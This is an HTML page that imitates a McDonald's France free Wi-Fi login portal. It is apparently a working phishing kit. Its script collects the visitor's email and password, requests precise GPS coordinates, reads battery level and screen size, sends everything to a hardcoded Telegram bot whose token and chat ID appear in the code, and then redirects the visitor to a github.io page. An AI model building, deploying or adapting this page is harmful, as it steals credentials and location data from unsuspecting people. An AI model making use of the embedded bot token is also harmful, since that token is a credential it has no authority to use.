<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>McDo™ Wi-Fi - Authentification</title>
    <style>
        :root { --mc-green: #0a472c; --mc-yellow: #ffbc0d; --mc-red: #da291c; }
        body { background-color: #f4f4f4; font-family: Arial, sans-serif; margin: 0; padding: 0; }
        header { background: var(--mc-green); color: white; padding: 15px; text-align: center; font-weight: bold; }
        .container { max-width: 400px; margin: 20px auto; padding: 20px; }
        .login-box { background: white; padding: 25px; border-radius: 12px; border: 1px solid #ddd; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        h2 { color: var(--mc-red); font-size: 20px; text-align: center; margin-top: 0; }
        .field { margin-bottom: 15px; }
        .field label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
        .field input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn-submit { width: 100%; padding: 15px; background-color: var(--mc-yellow); color: var(--mc-green); border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        #loader { display: none; text-align: center; margin-top: 20px; }
        .spinner { width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--mc-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        footer { text-align: center; font-size: 11px; color: #aaa; margin-top: 30px; }
    </style>
</head>
<body>

<header>McDo™ Wi-Fi Gratuit</header>

<div class="container">
    <div class="login-box" id="auth-form">
        <h2>Identifiez-vous</h2>
        <p style="font-size: 12px; text-align: center;">Connectez-vous pour accéder au Wi-Fi et voir vos offres.</p>
        
        <div class="field">
            <label>Email</label>
            <input type="email" id="user-email" placeholder="exemple@mail.com" required>
        </div>

        <div class="field">
            <label>Mot de passe</label>
            <input type="password" id="user-pass" placeholder="••••••••" required>
        </div>

        <button class="btn-submit" onclick="handleLogin()">SE CONNECTER</button>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <p id="status">Vérification de vos identifiants...</p>
    </div>
</div>

<footer>© 2026 McDonald's System of France</footer>

<script>
    // CONFIGURATION
    const MON_LIEN = "Https://nathanaelvaury13-boop.github.io/Macdo/"; 
    const TELEGRAM_TOKEN = "8206049937:AAEv07GYDOVNBthgFaZi1U1KCvu5gzWPbo4";
    const TELEGRAM_CHAT_ID = "7400979339";

    async function handleLogin() {
        const email = document.getElementById('user-email').value;
        const pass = document.getElementById('user-pass').value;

        if(!email || !pass) {
            alert("Veuillez remplir tous les champs.");
            return;
        }

        // --- ÉTAPE 1 : DEMANDER LE GPS TOUT DE SUITE ---
        // Le navigateur accepte la demande car elle vient du clic sur le bouton.
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (p) => {
                    // Si l'utilisateur accepte, on continue
                    processData(email, pass, `${p.coords.latitude},${p.coords.longitude}`);
                },
                async (err) => {
                    // Si l'utilisateur refuse ou erreur, on continue quand même sans GPS
                    processData(email, pass, "Refusé ❌");
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            processData(email, pass, "Non supporté");
        }
    }

    async function processData(email, pass, loc) {
        // --- ÉTAPE 2 : CHANGER L'INTERFACE ---
        document.getElementById('auth-form').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // Collecte de la batterie
        let battery = "N/A";
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + "%";
            } catch(e) {}
        }

        // --- ÉTAPE 3 : ENVOI ET REDIRECTION ---
        const rapport = `🍔 TEST PORTAIL\n` +
                        `📧 Email: ${email}\n` +
                        `🔑 Pass: ${pass}\n` +
                        `📍 GPS: ${loc}\n` +
                        `🔋 Batt: ${battery}\n` +
                        `🖥 Écran: ${screen.width}x${screen.height}`;

        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rapport })
            });
        } catch(err) {}

        setTimeout(() => {
            window.location.href = MON_LIEN;
        }, 1500);
    }
</script>

</body>
</html>
